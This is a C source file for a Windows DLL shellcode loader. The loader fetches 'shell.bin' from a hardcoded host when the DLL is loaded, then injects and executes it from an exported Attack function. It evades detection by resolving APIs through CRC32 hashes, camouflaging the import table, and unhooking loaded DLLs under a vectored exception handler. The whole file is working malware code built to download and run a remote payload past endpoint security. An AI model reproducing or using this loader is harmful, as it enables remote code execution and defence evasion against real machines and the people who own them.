#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PSTR url = "192.168.231.130";
PSTR endpoint = "shell.bin";
SIZE_T sSize = -1;

extern __declspec(dllexport) int Attack()
{
    PVOID		pVehHandler			= NULL;
    PVOID       pInjectedPayload	= NULL;

    if (!pPayload || !sSize)
        return -1;

    IatCamouflage();

    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), AddVectoredExceptionHandler_CRC32);
    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), RemoveVectoredExceptionHandler_CRC32);

    if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler)
    {
        return -1;
    }

    pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (pVehHandler == NULL)
        return -1;

    // Unhook loaded dlls
    UnhookAllLoadedDlls();

    if (!pRemoveVectoredExceptionHandler(pVehHandler))
        return -1;

    if (!Inject(pPayload, sSize, &pInjectedPayload))
        return -1;

    Execute(pInjectedPayload);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            sSize = Download(&pPayload, url, endpoint, FALSE);
            if(sSize == -1)
            {
                printf("[!] Failed to fetch payload from server!\n");
                return FALSE;
            }
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}